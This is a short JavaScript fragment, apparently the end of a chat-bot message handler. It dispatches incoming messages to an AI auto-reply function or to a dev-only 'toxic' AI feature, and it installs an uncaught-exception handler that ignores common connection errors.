        } else if (isDev && !itsMe && (settings.toxicagent === true || settings.toxicagent === 'true')) {
            toxicaiFeature(context).catch(() => {});
        } else if (!itsMe) {
            autoai(context).catch(() => {});
        }

    } catch (err) {
        console.log('❌ [TOXIC] Error:', err);
    }
};

module.exports.prewarmCache = prewarmCache;

process.on('uncaughtException', function (err) {
    let e = String(err);
    if (e.includes("conflict")) return;
    if (e.includes("not-authorized")) return;
    if (e.includes("Socket connection timeout")) return;
    if (e.includes("rate-overlimit")) return;
    if (e.includes("Connection Closed")) return;
    if (e.includes("Timed Out")) return;
    if (e.includes("Value not found")) return;
    console.log('❌ [UNCAUGHT EXCEPTION]:', err);
});
